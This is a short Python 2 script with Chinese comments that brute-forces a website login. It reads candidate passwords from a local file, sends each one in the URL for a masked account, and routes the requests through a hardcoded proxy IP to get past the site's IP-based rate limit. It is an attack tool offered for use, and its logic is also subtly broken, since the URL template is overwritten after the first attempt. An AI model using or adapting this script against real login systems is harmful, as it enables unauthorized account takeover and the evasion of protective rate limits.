#coding:utf-8
import requests
#测试登录功能，发现该接口将用户名和密码（md5加密后）的敏感信息暴露在URL里，尝试爆破，多次请求后有ip限制，但是通过下面的脚本可以继续爆破

# 需要测试的登陆地址
url = "https://**********&username=%s&password=%s&um=true"
res = ""
#将密码存在一个文件里
f = open("d:\\pass.txt")
for pwd in f:
    print pwd.strip("\n")
    proxies = {"http":"111.13.65.253:80"}
    url = url % ("****@****.com",pwd.strip("\n"))
    print url
    res = requests.get(url, proxies=proxies).text
    if "username" in res:
        print res
        break


